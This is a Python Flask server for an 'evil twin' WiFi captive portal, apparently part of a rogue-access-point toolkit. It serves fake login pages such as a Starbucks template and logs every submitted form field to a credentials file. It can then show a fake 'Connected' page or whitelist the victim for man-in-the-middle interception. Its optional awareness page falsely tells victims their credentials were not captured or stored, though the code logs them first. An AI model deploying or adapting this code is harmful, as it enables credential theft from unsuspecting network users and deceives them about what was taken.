#!/usr/bin/env python3
"""
Evil Portal Server - Runs on port 80 for captive portal
"""

from flask import Flask, request, redirect
import sys
import subprocess
import os
import datetime

app = Flask(__name__)

PORTAL_DIR = "/home/ov3rr1d3/wifi_arsenal/portals"
LOG_FILE = "/home/ov3rr1d3/wifi_arsenal/captures/portal_log.txt"

# Get config from environment variables
TEMPLATE = os.environ.get('PORTAL_TEMPLATE', 'starbucks')
POST_CAPTURE = os.environ.get('POST_CAPTURE', 'success')  # error, success, redirect, awareness
REDIRECT_URL = os.environ.get('REDIRECT_URL', '')

@app.route('/portal')
@app.route('/')
@app.route('/<path:path>')
def portal(path=''):
    """Serve the portal page for all requests"""
    template_path = os.path.join(PORTAL_DIR, f'{TEMPLATE}.html')
    try:
        with open(template_path, 'r') as f:
            return f.read()
    except:
        return '<h1>Portal Error</h1><p>Template not found</p>'

@app.route('/submit', methods=['POST'])
@app.route('/get', methods=['POST', 'GET'])
def submit():
    """Log submitted credentials and handle post-capture action"""
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Log all form data
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f'\n=== {timestamp} ===\n')
            all_data = {**request.args, **request.form}
            for key, value in all_data.items():
                f.write(f'{key}: {value}\n')
    except Exception as e:
        print(f"Error logging credentials: {e}")
    
    # Handle post-capture action
    if POST_CAPTURE == 'error':
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>Connection Failed</title></head>
        <body style="font-family: Arial; text-align: center; padding-top: 100px; background: #1a1a1a; color: #fff;">
            <h1 style="color: #ff4444;">✗ Connection Failed</h1>
            <p>Unable to connect to the network.</p>
            <p style="color: #888; font-size: 14px;">Please try again later or contact support.</p>
        </body>
        </html>
        '''
    
    elif POST_CAPTURE == 'success':
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>Connected</title></head>
        <body style="font-family: Arial; text-align: center; padding-top: 100px; background: #1a1a1a; color: #fff;">
            <h1 style="color: #44ff44;">✓ Connected</h1>
            <p>You are now connected to the network.</p>
            <p style="color: #888; font-size: 14px;">Enjoy your browsing!</p>
        </body>
        </html>
        '''
    
    elif POST_CAPTURE == 'redirect' and REDIRECT_URL:
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Connected</title>
            <meta http-equiv="refresh" content="2;url={REDIRECT_URL}">
        </head>
        <body style="font-family: Arial; text-align: center; padding-top: 100px; background: #1a1a1a; color: #fff;">
            <h1 style="color: #44ff44;">✓ Connected</h1>
            <p>Redirecting...</p>
        </body>
        </html>
        '''
    
    elif POST_CAPTURE == 'awareness':
        # Full S.P.A.R.K. awareness page (local copy for captive portal compatibility)
        return '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Awareness | S.P.A.R.K. Labs</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0a0a0a; color: #e0e0e0; line-height: 1.6; padding: 20px; }
        .container { max-width: 700px; margin: 0 auto; }
        h1 { color: #ff9900; font-size: 24px; margin: 20px 0 10px; }
        h2 { color: #ff9900; font-size: 18px; margin: 25px 0 10px; }
        .warning-icon { font-size: 48px; text-align: center; margin: 20px 0; }
        .highlight { background: #1a1a1a; border-left: 3px solid #ff9900; padding: 15px; margin: 15px 0; }
        .good-news { background: #0a1a0a; border-left: 3px solid #00ff00; padding: 15px; margin: 15px 0; }
        ul { margin: 10px 0 10px 20px; }
        li { margin: 5px 0; }
        .checklist li { list-style: none; margin-left: 0; }
        .checklist li:before { content: "✅ "; }
        ol { margin: 10px 0 10px 20px; }
        .footer { margin-top: 40px; padding-top: 20px; border-top: 1px solid #333; text-align: center; }
        .footer a { color: #ff9900; text-decoration: none; margin: 0 10px; }
        .btn { display: inline-block; padding: 12px 24px; background: #ff9900; color: #000; text-decoration: none; border-radius: 6px; font-weight: bold; margin: 10px 0; }
        a { color: #ff9900; }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning-icon">⚠️</div>
        
        <h1 style="text-align: center;">Security Awareness Notification</h1>
        
        <p style="text-align: center; margin: 15px 0;">
            You just connected to a simulated rogue access point.<br>
            This was part of an <strong>authorized security assessment</strong>.
        </p>
        
        <h2>🔍 What Just Happened</h2>
        <ul>
            <li>You connected to a fake WiFi network</li>
            <li>You entered credentials into a fake login page</li>
            <li>If this were a real attack, those credentials would now be stolen</li>
        </ul>
        
        <div class="good-news">
            <strong>Good news:</strong> Your actual credentials were NOT captured or stored. This was a security demonstration.
        </div>
        
        <h2>🎯 How This Attack Works</h2>
        <p>This is called an "Evil Twin" or "Rogue Access Point" attack:</p>
        <ol>
            <li>Attacker creates a WiFi network with a trusted name</li>
            <li>Your device connects — sometimes automatically</li>
            <li>A fake login page appears, looking legitimate</li>
            <li>You enter credentials thinking you are logging in</li>
            <li>The attacker now has your username and password</li>
        </ol>
        
        <h2>🛡️ How to Protect Yourself</h2>
        <ul>
            <li><strong>Verify network names</strong> — Ask staff for the exact WiFi name</li>
            <li><strong>Use a VPN</strong> — Encrypts your traffic even on compromised networks</li>
            <li><strong>Never enter sensitive credentials on captive portals</strong></li>
            <li><strong>Disable auto-connect</strong> — Turn off "Connect Automatically" for public networks</li>
            <li><strong>Use cellular for sensitive tasks</strong> — Banking, email, passwords</li>
            <li><strong>Use unique passwords</strong> — If one gets stolen, others stay safe</li>
        </ul>
        
        <h2>✅ Quick Security Checklist</h2>
        <ul class="checklist">
            <li>VPN installed and active on public WiFi</li>
            <li>Auto-connect disabled for open networks</li>
            <li>Password manager with unique passwords</li>
            <li>Two-factor authentication on important accounts</li>
        </ul>
        
        <div class="highlight">
            <h2 style="margin-top: 0;">ℹ️ About This Test</h2>
            <p>This simulation was conducted as part of an <strong>authorized security assessment</strong> by a professional penetration tester.</p>
            <p style="margin-top: 10px;">The goal is education, not exploitation. By experiencing this safely, you are now better prepared to recognize and avoid real attacks.</p>
        </div>
        
        <div class="footer">
            <a href="https://the-spark-initiative-labs.github.io/sparklabs-website/" target="_blank">Home</a>
            <a href="https://the-spark-initiative-labs.github.io/sparklabs-website/about.html" target="_blank">About</a>
            <a href="https://the-spark-initiative-labs.github.io/sparklabs-website/contact.html" target="_blank">Contact</a>
            <p style="margin-top: 15px; color: #666; font-size: 12px;">S.P.A.R.K. Labs — Security Assessment & Education</p>
        </div>
    </div>
</body>
</html>
        '''
    
    elif POST_CAPTURE == 'passthrough':
        # Passthrough mode - whitelist this client's MAC, then they get real internet + MITM
        try:
            client_ip = request.remote_addr
            subprocess.run(['/home/ov3rr1d3/wifi_arsenal/scripts/whitelist_client.sh', client_ip], timeout=5)
            print(f"[+] Whitelisted client: {client_ip}")
        except Exception as e:
            print(f"[-] Failed to whitelist client: {e}")
        
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>Connected</title></head>
        <body style="font-family: Arial; text-align: center; padding-top: 100px; background: #1a1a1a; color: #fff;">
            <h1 style="color: #44ff44;">✓ Connected</h1>
            <p>You are now connected to the network.</p>
            <p style="color: #888; font-size: 14px;">Enjoy your browsing!</p>
        </body>
        </html>
        '''
    
    else:
        # Default fallback
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>Connected</title></head>
        <body style="font-family: Arial; text-align: center; padding-top: 100px;">
            <h1 style="color: green;">✓ Connected</h1>
            <p>You are now connected to the network.</p>
        </body>
        </html>
        '''

if __name__ == '__main__':
    print(f"[*] Portal server running on http://10.0.0.1:80")
    print(f"[*] Template: {TEMPLATE}")
    print(f"[*] Post-capture: {POST_CAPTURE}")
    if REDIRECT_URL:
        print(f"[*] Redirect URL: {REDIRECT_URL}")
    print(f"[*] Logging to: {LOG_FILE}")
    app.run(host='0.0.0.0', port=80, debug=False)
